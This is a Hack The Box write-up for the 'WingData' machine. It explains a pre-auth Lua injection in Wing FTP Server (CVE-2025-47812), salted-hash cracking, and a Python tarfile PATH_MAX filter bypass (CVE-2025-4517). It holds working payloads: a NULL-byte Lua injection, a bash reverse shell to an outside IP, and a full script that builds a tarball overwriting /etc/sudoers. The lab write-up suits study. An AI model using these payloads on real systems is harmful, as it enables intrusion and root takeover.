---
title: HTB - WingData (Easy)
date: 2026-02-28 00:00:00 +0000
categories: [Hack The Box, Machine]
tags: [hackthebox, machine, linux, easy, wingftp, lua, rce, python, tarfile]     # TAG names should always be lowercase
image: /assets/img/wingdata/image%201.png
---

## Summary Exploitation
The WingData machine on Hack The Box was a sophisticated easy-level challenge that demonstrated how modern security filters can be bypassed through logic flaws and system-level constraints. After an initial Nmap scan revealed a Wing FTP Server (v7.4.3), I identified CVE-2025-47812, a Pre-Auth Session Poisoning vulnerability. By injecting a NULL byte and a Lua payload into the username field, I bypassed authentication and poisoned a server-side session file. Since the server uses loadfile() to restore sessions, I successfully triggered a reverse shell upon accessing the poisoned session.

After gaining a foothold, I performed lateral movement by cracking a password hash found in a leaked users.xml file. Using the default WingFTP salt, I recovered the password for the user wacky, allowing for SSH access. For the final escalation, I analyzed a Python backup restoration script running as root. Despite the script’s use of the "secure" filter="data" parameter in the tarfile module, it was vulnerable to CVE-2025-4517. By crafting a malicious tarball that exceeded the Linux PATH_MAX (4096 bytes) limit via deeply nested directories, I blinded the filter's path validation. This allowed me to use a hardlink inode hijack to overwrite the /etc/sudoers file, successfully escalating my privileges to root.

## Reconnaissance
### Scanning IP Address
We start with scan the IP Address with Nmap.
```bash
nmap -sC -sV 10.129.5.124
```

![nmap TCP result](/assets/img/wingdata/image%202.png)

Analysis:
1. Port 22 (SSH): Running OpenSSH 9.2p1.
2. Port 80 (HTTP): Running Apache 2.4.66. The scanner indicates a redirect to `http://wingdata.htb/`.

### Web Exploration
There is nothing interesting on the main page except the client portal button.

![web 1](/assets/img/wingdata/image%204.png)

Clicking the button redirects us to `http://ftp.wingdata.htb/login.html`, revealing a new subdomain `ftp`.

![web 1](/assets/img/wingdata/image%203.png)

The login page reveals that the server is running `Wing FTP Server version 7.4.3`. With a specific version number identified, we can now search for known vulnerabilities or cve that affect this release.

CVE:\
CVE-2025-47812 - [Pre-Auth Wing FTP Server RCE](https://github.com/4m3rr0r/CVE-2025-47812-poc)

## Initial Access
### Technical Breakdown
Like FTP usual, we can log into the Wing FTP server with the username `anonymous` and a blank password if anonymous login is enabled.

![anon](/assets/img/wingdata/image%205.png)

And here is how the Burp Suite respond to the correct and incorrect credential.

![anon](/assets/img/wingdata/image%206.png)

![anon](/assets/img/wingdata/image%207.png)

When the credential is correct and authentication is successful, the application will give the user `UID` cookie. Now, let's try inserting NULL byte after the `anonymous`.

![anon](/assets/img/wingdata/image%208.png)

We change the username to `anonymous%00`, and the application indicates that authentication was successful. Wait, what just happened? Is `anonymous%00` considered a valid user? To understand this, we need to examine the source code and see how the authentication logic works.

`loginok.html`
```lua
local username = _GET["username"] or _POST["username"] or ""
local password = _GET["password"] or _POST["password"] or ""
local remember = _GET["remember"] or _POST["remember"] or ""
local redir = _GET["redir"] or _POST["redir"] or ""
local lang = _GET["lang"] or _POST["lang"] or ""

username = string.gsub(username,"+"," ")
username = string.gsub(username,"\t","+")
password = string.gsub(password,"+"," ")
password = string.gsub(password,"\t","+")

local result = c_CheckUser(username,password)
if result ~= OK_CHECK_CONNECTION then
	c_AddWebLog("User '"..string.sub(username, 1, 64).."' login failed! (IP:".._REMOTE_IP..")","0",DOMAIN_LOG_WEB_RESPOND)
	print("<script>alert('"..LOGINERROR_STR[tonumber(result)].."');location='login.html';</script>")
```

This is the code that handles user authentication. As we can see, there isn’t much input sanitization or filtering. So why can we log in with `anonymous%00`? It all comes down to how the `c_CheckUser()` function works. This function checks whether the combination of username and password is correct. When we provide a NULL byte after a valid username, it always returns `OK_CHECK_CONNECTION`, even if we append anything after the NULL byte, such as `anonymous%00test`.

loginok.html
```lua
else
	if _COOKIE["UID"] ~= nil then
		_SESSION_ID = _COOKIE["UID"]
		local retval = SessionModule.load(_SESSION_ID)
		if retval == false then
			_SESSION_ID = SessionModule.new()
			if _UseSSL == true then
				_SETCOOKIE = _SETCOOKIE.."Set-Cookie: UID=".._SESSION_ID.."; HttpOnly; Secure\r\n"
			else
				_SETCOOKIE = _SETCOOKIE.."Set-Cookie: UID=".._SESSION_ID.."; HttpOnly\r\n"
			end
			rawset(_COOKIE,"UID",_SESSION_ID)
		end
	else
		_SESSION_ID = SessionModule.new()
		if _UseSSL == true then
			_SETCOOKIE = _SETCOOKIE.."Set-Cookie: UID=".._SESSION_ID.."; HttpOnly; Secure\r\n"
		else
			_SETCOOKIE = _SETCOOKIE.."Set-Cookie: UID=".._SESSION_ID.."; HttpOnly\r\n"
		end
		rawset(_COOKIE,"UID",_SESSION_ID)
	end

	if package.config:sub(1,1) == "\\" then
		username = string.lower(username)
	end
	rawset(_SESSION,"username",username)
	rawset(_SESSION,"ipaddress",_REMOTE_IP)
	SessionModule.save(_SESSION_ID)
```

This code shows how the cookie is handled if the credentials are valid. The dangerous part here is this line `rawset(_SESSION,"username",username)`. Since `c_CheckUser()` ignores the NULL byte and anything after it, our username value including `%00test` is inserted fully into the `_SESSION` table. Then, `SessionModule.save(_SESSION_ID)` writes it to a physical file on the server.

If we look at `SessionModule.save()`:
```lua
function save (id)
	if not check_id (id) then
		return nil, INVALID_SESSION_ID
	end

	if isfolder(root_dir) == false then
		mkdir(root_dir)
		chmod(root_dir, "0600")
	end

	local fh = assert(_open(filename (id), "w+"))
	serialize(_SESSION, function (s) fh:write(s) end)
	fh:close()
	chmod(filename(id), "0600")
end
```

The application creates a new session file containing `_SESSION`, which includes our full username. And the most important is, the session file is also written in Lua.

```lua
function serialize(tab,outf)
	if type(tab) == "table" then
		for k,v in pairs(tab) do
			if type(k) == "string" then k="'"..k.."'" end
			if(type(v) == "string") then
				outf("_SESSION["..k.."]=[["..v.."]]\r\n")
			elseif(type(v) == "number") then
				outf("_SESSION["..k.."]="..v.."\r\n")
			elseif(type(v) == "function") then
				outf("_SESSION["..k.."]=\"[function]\"\r\n")
			elseif(type(v) == "nil") then
				outf("_SESSION["..k.."]=nil\r\n")
			else
				outf("_SESSION["..k.."]={")
				serialize(v,outf)
				outf("}\r\n")
			end
		end
	end
end
```

From `outf("_SESSION["..k.."]=[["..v.."]]\r\n")`, our username is stored inside `[["..v.."]]`. So what if we could break out of the `[[ ]]` and inject our own Lua code?

But this only writes our code to the session file and it doesn’t execute it. So what’s the point if we can’t actually run it, right? Here’s the catch, we actually can execute it. The  `UID` we see in the Burp Suite cookie is actually a session filename (with lua extension).

`SessionModule.lua`:
```lua
function load (id)
	if not check_id (id) then
		return false
	end

	local filepath = filename(id)
	if fileexist(filepath) then
		if filetime(filepath) + timeout < time() then
			remove(filepath)
			return false
		end

		local ipHash = string.sub(id, -32)
		if c_RestrictSessionIP() == true and ipHash ~= md5(_REMOTE_IP) then
			return false
		end

		if ipHash == "f528764d624db129b32c21fbca0cb8d6" and _REMOTE_IP ~= "127.0.0.1" then
			return false
		end

		local f, err = loadfile(filepath)
		if not f then
			return false
		else
			f()
			return true
		end

	end
end
```

Basically, the code attempts to locate the session file (whose name is the value of UID), and `local f, err = loadfile(filepath)` reads and compiles that file as Lua code. Then, `f()` executes it. To trigger this, we need to send a POST request to the `/dir.html` with `UID`.

Full explanation on how the [Pre-Auth Wing FTP Server RCE (CVE-2025-47812) works](https://www.rcesecurity.com/2025/06/what-the-null-wing-ftp-server-rce-cve-2025-47812/).

### Attack Strategy
We will use `anonymous` as our username because it was a valid username (the anonymous login was enabled). Then we will append a NULL byte `%00` followed by with our malicious Lua code to achieve RCE. After the session file created, we will use the `UID` to send a POST request to the `/dir.html`

### Proof Of Concept
```lua
anonymous%00]]%0dlocal+h+%3d+io.popen("id")%0dlocal+r+%3d+h%3aread("*a")%0dh%3aclose()%0dprint(r)%0d--
```

`%0d` - create a new line\
`io.popen("id")` - open the pipe to the command "id" in read mode ("r")\
`h:read("*a")` - read the entire output from the command and store it in the lua variable\
`print(r)` - print the value

![anon](/assets/img/wingdata/image%209.png)

Damn, I really love this XD. Now we get the RCE and we can proceed to inject our reverse shell payload.

```lua
anonymous%00]]os.execute("bash+-c+'bash+-i+>%26+/dev/tcp/10.10.15.14/4444+0>%261'")--
```

We use `os.execute` because we don't need a visible output.

![rev shell](/assets/img/wingdata/image%2010.png)

### Credential Hunting
To find our target user, we need to run `/etc/passwd`.

![anon](/assets/img/wingdata/image%2011.png)

Our target is user `wacky`. Use this command to grep any file that mentioned wackey

```bash
grep -ri wacky
```

![anon](/assets/img/wingdata/image%2012.png)

The file `Data/1/users/wacky.xml` caught my attention because it uses the `<username>` tag. Maybe there is a leaked password in there?

```bash
cat Data/1/users/wacky.xml
```

![wacky xml](/assets/img/wingdata/image%2013.png)

Nice we found a password hash, but we couldn't crack it. So I checked the Wing FTP documentation to understand how passwords are handled.

According to the [Wing FTP Server Help](https://www.wftpserver.com/help/ftpserver/index.html?compression.htm), the server uses a salt when hashing passwords. The default salt is `WingFTP`.

### Crack the hash
wacky.hash
```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP
```

Then use Hashcat to crack it:
```bash
hashcat -m 1410 wacky.hash /usr/share/wordlists/rockyou.txt
```

Cracked hash:
```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
```

### User flag
We now have the password for `wacky`. If the password was reused, we can try to log in via SSH.

```bash
ssh wacky@10.129.5.124
password: !#7Blushing^*Bride5
```

![wacky xml](/assets/img/wingdata/image%2014.png)

## Privilege Escalation
### Local Enumeration
We start enumeration by checking which binaries we can run with sudo:
```bash
sudo -l
```

![sudo l](/assets/img/wingdata/image%2015.png)

We can run as sudo with this specific command:
```bash
/usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

> Note: * means a wildcard, we can pass any argument for that python script
{: .prompt-info }

Read the `/opt/backup_clients/restore_backup_clients.py`:
```python
#!/usr/bin/env python3
import tarfile
import os
import sys
import re
import argparse

BACKUP_BASE_DIR = "/opt/backup_clients/backups"
STAGING_BASE = "/opt/backup_clients/restored_backups"

def validate_backup_name(filename):
    if not re.fullmatch(r"^backup_\d+\.tar$", filename):
        return False
    client_id = filename.split('_')[1].rstrip('.tar')
    return client_id.isdigit() and client_id != "0"

def validate_restore_tag(tag):
    return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))

def main():
    parser = argparse.ArgumentParser(
        description="Restore client configuration from a validated backup tarball.",
        epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"
    )
    parser.add_argument(
        "-b", "--backup",
        required=True,
        help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, "
             "where <client_id> is a positive integer, e.g., backup_1001.tar)"
    )
    parser.add_argument(
        "-r", "--restore-dir",
        required=True,
        help="Staging directory name for the restore operation. "
             "Must follow the format: restore_<client_user> (e.g., restore_john). "
             "Only alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters)."
    )

    args = parser.parse_args()

    if not validate_backup_name(args.backup):
        print("[!] Invalid backup name. Expected format: backup_<client_id>.tar (e.g., backup_1001.tar)", file=sys.stderr)
        sys.exit(1)

    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)
    if not os.path.isfile(backup_path):
        print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)
        sys.exit(1)

    if not args.restore_dir.startswith("restore_"):
        print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)
        sys.exit(1)

    tag = args.restore_dir[8:]
    if not tag:
        print("[!] --restore-dir must include a non-empty tag after 'restore_'", file=sys.stderr)
        sys.exit(1)

    if not validate_restore_tag(tag):
        print("[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores", file=sys.stderr)
        sys.exit(1)

    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
    print(f"[+] Backup: {args.backup}")
    print(f"[+] Staging directory: {staging_dir}")

    os.makedirs(staging_dir, exist_ok=True)

    try:
        with tarfile.open(backup_path, "r") as tar:
            tar.extractall(path=staging_dir, filter="data")
        print(f"[+] Extraction completed in {staging_dir}")
    except (tarfile.TarError, OSError, Exception) as e:
        print(f"[!] Error during extraction: {e}", file=sys.stderr)
        sys.exit(2)

if __name__ == "__main__":
    main()
```

### Technical Breakdown
Let's analyze the key parts of this script.

```python
def validate_backup_name(filename):
    if not re.fullmatch(r"^backup_\d+\.tar$", filename):
        return False
    client_id = filename.split('_')[1].rstrip('.tar')
    return client_id.isdigit() and client_id != "0"
```
This function uses a regex to ensure the filename follows the pattern backup_123.tar, where the client ID must be a positive integer.

```python
def validate_restore_tag(tag):
    return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))
```
This validates that the restore tag contains only alphanumeric characters and underscores, with a length of 1-24 characters.

```python
parser.add_argument(
	"-r", "--restore-dir",
	required=True,
	help="Staging directory name for the restore operation. "
			"Must follow the format: restore_<client_user> (e.g., restore_john). "
			"Only alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters)."
)
```
The `-r` flag is required and expects a value in the format `restore_anything`, where "anything" must follow the tag validation rules above.

 ```python
try:
	with tarfile.open(backup_path, "r") as tar:
		tar.extractall(path=staging_dir, filter="data")
	print(f"[+] Extraction completed in {staging_dir}")
except (tarfile.TarError, OSError, Exception) as e:
	print(f"[!] Error during extraction: {e}", file=sys.stderr)
	sys.exit(2)
 ```
The script uses Python's tarfile module to read and extract the backup tar file. Notice the use of `tar.extractall(path=staging_dir, filter="data")` with the `filter="data" parameter`.

CVE:\
CVE-2025-4517 - [Python tarfile Arbitrary File Write via Path Traversal](https://github.com/StealthByte0/CVE-2025-4517-poc)

The `data` filter in Python's tarfile module was designed as a security feature to block dangerous archive members and only allow to put the file in intended directory during extraction.

For detail explanation, please refer to [Arbitrary Filesystem Write via Python `tarfile` Extraction with `filter="data"`](https://www.cve.news/cve-2025-4517/)

If we attempt to create a malicious tar file with a simple path traversal like `../../outside.txt` and extract it, we get an error:

![outside](/assets/img/wingdata/image%2016.png)

Hmm why? why did this fail? To have a better undestanding, I refer to [Tarfile Realpath Overflow Vulnerability](https://github.com/google/security-research/security/advisories/GHSA-hgqp-3mmf-7h8f). The data filter uses `os.path.realpath()` to validate paths during extraction. When the filter encounters a member named `../../outside.txt`, it calls `realpath()` on the full path (`staging_dir + "/" + "../../outside.txt"`). This function resolves all `..` components and detects that the file would land outside the staging directory. The filter then raises `tarfile.OutsideDestinationError`, blocking the extraction. This shows that the filter successfully blocks simple path traversal attempts.

However, a critical bypass exists:

"A bug exists when processing a path with symlinks is shorter than `PATH_MAX`, but longer than `PATH_MAX` when the symlinks are substituted by `os.path.realpath()`. Any symlinks that are beyond `PATH_MAX` are not expanded."

`PATH_MAX` is a Linux system limit (usually 4096 characters) that defines the maximum length of a filesystem path. When Python's `os.path.realpath()` encounters a path that exceeds this limit during symlink resolution, it stops expanding and returns a partial result.

This is precisely how our exploit bypasses the `data` filter. By crafting a tar archive with 16 levels of nested directories using 247-character names, we ensure that when `os.path.realpath()` attempts to resolve the path during filtering, it hits the `PATH_MAX` limit and truncates the resolution. Then the `../../../../../../../etc` is never seen or checked by the filter. Because the filter mistakenly believes the path is safe, it allows extraction. During actual extraction, the operating system follows the full symlink chain, reaches the system root directory, and enters `/etc`.

The hard link technique further enhances this attack. By creating a hard link that points to the escaped path (`escape/sudoers`), and then writing our payload to a regular file with the same name, the content is written to the inode associated with that hard link (the real `/etc/sudoers` file).

### Attack Strategy
We can craft a malicious tar archive that:

1. Creates a deep nested directory structure with 16 levels of 247-character directory names to exceed `PATH_MAX` when fully resolved.

2. Builds a symlink chain at each level that points deeper into the structure.

3. Adds a final symlink at the bottom that points back up 16 levels to go to root tar file.

4. Creates an escape symlink that traverses this entire chain plus additional ../ components to reach the target system directory (`/etc`).

5. Uses a hard link that points to the escaped path (`escape/sudoers`).

6. Writes the payload to a regular file with the same name as the hard link.

During extraction with `filter="data"`, the filter's `os.path.realpath()` validation fails at the `PATH_MAX` limit and never sees the escape. However, the operating system successfully follows the complete symlink chain during extraction and writes the payload to the intended target outside the staging directory. This allows arbitrary filesystem writes despite the data filter being active.

It took me 3 days of experiment to fully understand what's going on here XD.

### Proof Of Concept
```python
#!/usr/bin/env python3
import tarfile
import os
import io
import sys

def create_sudoers_exploit(output_file="backup_1337.tar"):
    """
    Creates a malicious tar file that adds wacky to sudoers
    by exploiting CVE-2025-4517 (PATH_MAX overflow in tarfile filter)
    """
    
    # The payload: give wacky full sudo privileges without password
    sudoers_entry = "wacky ALL=(ALL) NOPASSWD: ALL\n"
    
    # Calculate the right length based on OS (247 for Linux, 55 for macOS)
    # 247 chars × 16 levels = 3952 chars, leaving room for PATH_MAX (4096)
    comp = 'd' * (55 if sys.platform == 'darwin' else 247)
    steps = "abcdefghijklmnop"  # 16 levels
    path = ""
    
    print("[*] Creating malicious tar archive...")
    
    with tarfile.open(output_file, mode="w") as tar:
        # Phase 1: Create deep nested structure with symlinks
        print("[*] Building deep directory structure...")
        for i in steps:
            # Create long directory (247 'd's)
            a = tarfile.TarInfo(os.path.join(path, comp))
            a.type = tarfile.DIRTYPE
            tar.addfile(a)
            
            # Create symlink named after current letter pointing to long dir
            b = tarfile.TarInfo(os.path.join(path, i))
            b.type = tarfile.SYMTYPE
            b.linkname = comp
            tar.addfile(b)
            
            # Go deeper
            path = os.path.join(path, comp)
        
        # Phase 2: Create the "elevator" symlink at the bottom
        print("[*] Creating PATH_MAX overflow symlink...")
        linkpath = os.path.join("/".join(steps), "l" * 254)
        l = tarfile.TarInfo(linkpath)
        l.type = tarfile.SYMTYPE
        l.linkname = "../" * len(steps)  # Points up 16 levels
        tar.addfile(l)
        
        # Phase 3: Create escape symlink to /etc
        print("[*] Creating escape symlink to /etc...")
        e = tarfile.TarInfo("escape")
        e.type = tarfile.SYMTYPE
        # Go through the chain, then up 7 more levels to reach root, then into /etc
        e.linkname = linkpath + "/../../../../../../../etc"
        tar.addfile(e)
        
        # Phase 4: Create hard link pointing to escape/sudoers
        print("[*] Creating hard link...")
        f = tarfile.TarInfo("sudoers_link")
        f.type = tarfile.LNKTYPE
        f.linkname = "escape/sudoers"
        tar.addfile(f)
        
        # Phase 5: Write payload to the hard link (this will go to /etc/sudoers)
        print("[*] Adding payload...")
        content = sudoers_entry.encode()
        c = tarfile.TarInfo("sudoers_link")
        c.type = tarfile.REGTYPE
        c.size = len(content)
        tar.addfile(c, fileobj=io.BytesIO(content))
        
        # Optional: Create a test file to verify the escape works
        test_content = b"This file was written outside the staging directory!\n"
        n = tarfile.TarInfo("escape/test.txt")
        n.type = tarfile.REGTYPE
        n.size = len(test_content)
        tar.addfile(n, fileobj=io.BytesIO(test_content))
    
    print(f"[+] Successfully created: {output_file}")
    print(f"[+] Payload: {sudoers_entry.strip()}")
    
    # Verify the contents
    print("\n[+] Tar contents:")
    with tarfile.open(output_file, "r") as tar:
        members = tar.getmembers()
        symlinks = [m for m in members if m.issym()]
        hardlinks = [m for m in members if m.islnk()]
        files = [m for m in members if m.isreg()]
        
        print(f"  - {len(symlinks)} symlinks")
        print(f"  - {len(hardlinks)} hard links")
        print(f"  - {len(files)} regular files")
        
        # Show the critical components
        print("\n[+] Key components:")
        for m in members:
            if m.name == "escape":
                print(f"  🔗 escape -> {m.linkname}")
            elif m.name == "sudoers_link" and m.islnk():
                print(f"  🔗 sudoers_link (hard link) -> {m.linkname}")
            elif m.name == "sudoers_link" and m.isreg():
                print(f"  📄 sudoers_link (regular file) - {m.size} bytes")
            elif m.issym() and len(m.name) > 200:
                print(f"  🔗 ...{m.name[-50:]} -> {m.linkname}")

if __name__ == "__main__":
    create_sudoers_exploit("backup_1337.tar")
```

![outside](/assets/img/wingdata/image%2017.png)

> Don't forget to place your tar file into /opt/backup_clients/backups/ before running the restore script.
{: .prompt-info }

## Root Flag
![outside](/assets/img/wingdata/image%2018.png)

And we got root! To be honest, for me to understand why we could bypass the `data` filter was the hardest part of this privilege escalation. But because it was difficult, that's exactly what made it fun XD.